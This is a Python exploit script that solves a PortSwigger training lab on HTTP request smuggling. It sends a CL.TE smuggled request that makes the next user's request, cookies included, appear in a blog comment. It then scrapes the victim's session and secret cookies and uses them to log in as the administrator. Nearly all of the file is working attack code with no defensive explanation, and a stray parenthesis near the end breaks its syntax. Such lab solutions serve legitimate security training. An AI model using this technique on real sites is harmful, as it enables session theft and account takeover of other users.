# Exploiting HTTP request smuggling to capture other users' requests

# https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import socket
import ssl
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(s, url):
	r = s.get(url)
	if r.status_code != 200:
		r = s.get(url)
		if r.status_code != 200:
			r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def build_request(s, url, i):
	subd = url.split('://')[1]
	csrf_token = get_csrf_token(s, url + '/post?postId=5')
	session_cookie = s.cookies.get_dict().get('session')
	request_body = '0\r\n'
	request_body += '\r\n'
	request_body += 'POST /post/comment HTTP/1.1\r\n'
	request_body += 'Cookie: session=%s\r\n' % session_cookie
	request_body += 'Content-Type: application/x-www-form-urlencoded\r\n'
	request_body += 'Content-Length: ' + str(900 + (i * 10)) + '\r\n'
	request_body += '\r\n'
	request_body += 'csrf=' + csrf_token + '&postId=5&name=gwyo&email=gwyo%40attacker.com&website=&comment='

	request_content = 'POST / HTTP/1.1\r\n'
	request_content += 'Host: ' + subd + '\r\n'
	request_content += 'Content-Length: ' + str(len(request_body)) + '\r\n'
	request_content += 'Transfer-Encoding: chunked\r\n'
	request_content += '\r\n'
	request_content += request_body
	print("------------------------------------------------------")
	print(request_content)
	print("------------------------------------------------------")
	return request_content

def send_sequence(s, url, port, i):
	subd = url.split('://')[1]
	content = build_request(s, url, i)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	code = send_smuggling(content, subd, port)
	if code == 'HTTP/1.1 200 OK':
		time.sleep(2)
		r = s.get(url + '/post?postId=5')
		print(r)
		if r.status_code == 200:
			code = send_smuggling(content, subd, port)
			code = send_smuggling(content, subd, port)
			time.sleep(2)
			r = s.get(url + '/post?postId=5')
			print('\t%s' % r)
			if r.status_code == 500:
				time.sleep(2)
				r = s.get(url + '/post?postId=5')
				print('\t\t%s' % r)
			res = r.text
			if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
				fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
				secret = re.search('; secret=(.*);', res).group(1)
				session = re.search('; session=(.*)\r\n', res).group(1)
				print('[+] Found Fingerprint:\t%s' % fingerprint)
				print('[+] Found Secret:\t%s' % secret)
				print('[+] Found Session:\t%s' % session)
				return [secret, session, fingerprint]
		else:
			time.sleep(2)
			r = s.get(url + '/post?postId=5')
			print(r)
			if r.status_code == 200:
				code = send_smuggling(content, subd, port)
				code = send_smuggling(content, subd, port)
				time.sleep(2)
				r = s.get(url + '/post?postId=5')
				print('\t%s' % r)
				if r.status_code == 500:
					time.sleep(2)
					r = s.get(url + '/post?postId=5')
					print('\t\t%s' % r)
				res = r.text
				if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
					fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
					secret = re.search('; secret=(.*);', res).group(1)
					session = re.search('; session=(.*)\r\n', res).group(1)
					print('[+] Found Fingerprint:\t%s' % fingerprint)
					print('[+] Found Secret:\t%s' % secret)
					print('[+] Found Session:\t%s' % session)
					return [secret, session, fingerprint]
			else:
				time.sleep(2)
				r = s.get(url + '/post?postId=5')
				print(r)
				if r.status_code == 200:
					code = send_smuggling(content, subd, port)
					code = send_smuggling(content, subd, port)
					time.sleep(2)
					r = s.get(url + '/post?postId=5')
					print('\t%s' % r)
					if r.status_code == 500:
						time.sleep(2)
						r = s.get(url + '/post?postId=5')
						print('\t\t%s' % r)
					res = r.text
					if re.search('; secret=(.*);', res) and re.search('; session=(.*)\r\n', res):
						fingerprint = re.search('victim-fingerprint=(.*); secret', res).group(1)
						secret = re.search('; secret=(.*);', res).group(1)
						session = re.search('; session=(.*)\r\n', res).group(1)
						print('[+] Found Fingerprint:\t%s' % fingerprint)
						print('[+] Found Secret:\t%s' % secret)
						print('[+] Found Session:\t%s' % session)
						return [secret, session, fingerprint]
	return False

def send_smuggling(request_content, host, port):
	context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
	context.check_hostname = False
	context.verify_mode = ssl.CERT_NONE
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock = context.wrap_socket(sock, server_hostname=host)
	sock.connect((host, port))
	sock.sendall(request_content.encode())
	resp = sock.recv(256)
	print(' '.join(resp.decode().split(None,3)[0:3]))
	resp_code = ' '.join(resp.decode().split(None,3)[0:3])
	sock.close()
	return resp_code

##########################################################
#	MAIN
##########################################################

def main():
	print("[+] Lab: Exploiting HTTP request smuggling to capture other users' requests")
	parser = argparse.ArgumentParser(description="[+] Lab: Exploiting HTTP request smuggling to capture other users' requests")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	if parsed_url.port:
		port = parsed_url.port
	elif parsed_url.scheme == "https":
		port = 443
	elif parsed_url.scheme == "http":
		port = 80
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		session_cookie = s.cookies.get_dict().get('session')
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			time.sleep(1)
			print('\n[+] Trying send HTTP Request Smuggling attack...\n')
			post_path = url + '/post?postId=5'
			request_content = build_request(s, url, 5)
			secret = False
			while not secret:
				for i in range(1, 7):
					print('[+] Trying to send request sequence #%s' % i)
					victim_cookies = send_sequence(s, url, port, i)
					time.sleep(1)
					if victim_cookies:
						secret = victim_cookies[0]
						session = victim_cookies[1]
						fingerprint = victim_cookies[2]
						break
			if len(secret) == len(session) == len(fingerprint):
				print('[+] Trying impersonate user with his cookies...\n')
				s.cookies.clear()
				cookies = {"victim-fingerprint": fingerprint, "session": session, "secret": secret}
				r = s.get(url + '/my-account', cookies=cookies)
				print(r)
				if 'Your username is: administrator' in r.text:
					time.sleep(5)
					s.cookies.clear()
					s.headers.clear()
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved !')
			else: 
				print('\n[-] The exploit failed to retrieve User cookies <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)
)

if __name__ == "__main__":
	main()
